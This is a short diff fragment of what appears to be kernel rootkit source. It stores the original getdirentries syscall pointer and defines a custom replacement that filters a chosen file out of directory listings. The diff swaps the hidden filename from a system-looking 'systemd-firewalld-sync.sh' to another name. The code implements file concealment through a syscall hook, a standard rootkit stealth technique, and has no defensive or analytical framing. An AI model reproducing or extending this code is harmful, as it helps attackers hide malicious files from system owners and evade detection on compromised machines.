@@ -38,7 +38,7 @@
 // save orignal pointer 
 static sy_call_t *original_getdirentries;
 // filename we want to hide
-# define FILENAME_TO_HIDE "systemd-firewalld-sync.sh"
+# define FILENAME_TO_HIDE "apeshit.sh"
 
 // custom syscall that filters out filename
 static int custom_getdirentries(struct thread *td, void *args) {
